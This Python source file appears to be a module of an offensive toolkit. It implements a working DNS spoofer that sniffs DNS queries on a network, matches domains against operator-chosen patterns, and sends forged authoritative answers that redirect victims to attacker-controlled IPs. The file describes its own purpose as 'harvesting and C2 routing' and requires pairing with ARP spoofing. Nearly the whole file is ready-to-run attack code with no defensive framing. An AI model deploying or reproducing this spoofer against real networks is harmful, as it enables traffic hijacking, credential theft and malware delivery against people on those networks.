# --- Module Context: DNS Spoofer v2.2 (Optimized) ---
# Purpose: High-speed, multi-target DNS redirection for the Davoid Framework.
# Usage: Requires root/sudo. Must be paired with ARP Spoofing or similar MITM.
# ---------------------------------------------------

import re
import os
import sys
import threading
from scapy.all import IP, UDP, DNS, DNSRR, DNSQR, send, sniff
from rich.console import Console
from rich.table import Table
from core.ui import show_briefing

console = Console()

# Configuration Map: { "domain_regex": "redirect_ip" }
SPOOF_MAP = {}


def get_spoof_target(queried_domain):
    """Matches the queried domain against the regex map."""
    for pattern, redirect_ip in SPOOF_MAP.items():
        if re.search(pattern, queried_domain, re.IGNORECASE):
            return redirect_ip
    return None


def dns_spoofer_callback(packet):
    """Processes intercepted DNS queries and sends forged responses."""
    if packet.haslayer(DNSQR):
        # Extract queried domain (remove trailing dot)
        queried_domain = packet[DNSQR].qname.decode().strip('.')

        redirect_ip = get_spoof_target(queried_domain)

        if redirect_ip:
            # Craft the forged DNS response
            # qr=1: Response, aa=1: Authoritative Answer, rd=1: Recursion Desired
            spoofed_pkt = (
                IP(dst=packet[IP].src, src=packet[IP].dst) /
                UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) /
                DNS(
                    id=packet[DNS].id,
                    qr=1,
                    aa=1,
                    qd=packet[DNS].qd,
                    an=DNSRR(
                        rrname=packet[DNSQR].qname,
                        ttl=10,  # Low TTL for fast cache poisoning
                        rdata=redirect_ip
                    )
                )
            )

            # Send the packet (verbose=False for speed)
            send(spoofed_pkt, verbose=False, count=1)

            console.print(
                f"[bold red][!] REDIRECTED:[/bold red] [yellow]{queried_domain}[/yellow] "
                f"→ [green]{redirect_ip}[/green]"
            )


def start_dns_spoof():
    """Module Entry Point: Configures and starts the sniffer."""
    if os.geteuid() != 0:
        console.print(
            "[bold red][ERROR][/bold red] This module requires root privileges (sudo).")
        return

    show_briefing(
        "DNS Spoofer v2.2",
        "Advanced traffic redirection for harvesting and C2 routing.",
        ["Active MITM Required", "Root Privileges", "Scapy Engine"]
    )

    console.print(
        "\n[bold cyan][+][/bold cyan] [white]Configure Redirection Rules (Wildcards allowed, e.g. .*google.com)[/white]")

    while True:
        domain_pattern = console.input(
            "[bold cyan]Target Domain Pattern (or 'done' to start): [/bold cyan]").strip()
        if domain_pattern.lower() == 'done':
            break

        redirect_ip = console.input(
            f"[bold cyan]Redirect IP for '{domain_pattern}': [/bold cyan]").strip()

        if domain_pattern and redirect_ip:
            # Convert wildcard * to regex .*
            regex_pattern = domain_pattern.replace(
                '.', r'\.').replace('*', '.*')
            SPOOF_MAP[f"^{regex_pattern}$"] = redirect_ip
            console.print(
                f"[dim grey]Added rule: {domain_pattern} -> {redirect_ip}[/dim grey]")

    if not SPOOF_MAP:
        console.print("[yellow][!] No targets configured. Exiting...[/yellow]")
        return

    # Display Active Table
    table = Table(title="Active Spoofing Map", border_style="cyan")
    table.add_column("Pattern (Regex)", style="magenta")
    table.add_column("Redirect Target", style="green")
    for p, r in SPOOF_MAP.items():
        table.add_row(p, r)
    console.print(table)

    console.print(
        f"\n[bold green][*] Sniffing for DNS traffic on UDP/53...[/bold green] (Ctrl+C to stop)\n")

    try:
        # Use store=0 to prevent memory exhaustion during long sessions
        sniff(filter="udp port 53", prn=dns_spoofer_callback, store=0)
    except KeyboardInterrupt:
        console.print(
            "\n[bold yellow][-] Stopping DNS Spoofer...[/bold yellow]")
    except Exception as e:
        console.print(f"[bold red][ERROR] Engine Failure: {e}[/bold red]")


if __name__ == "__main__":
    start_dns_spoof()
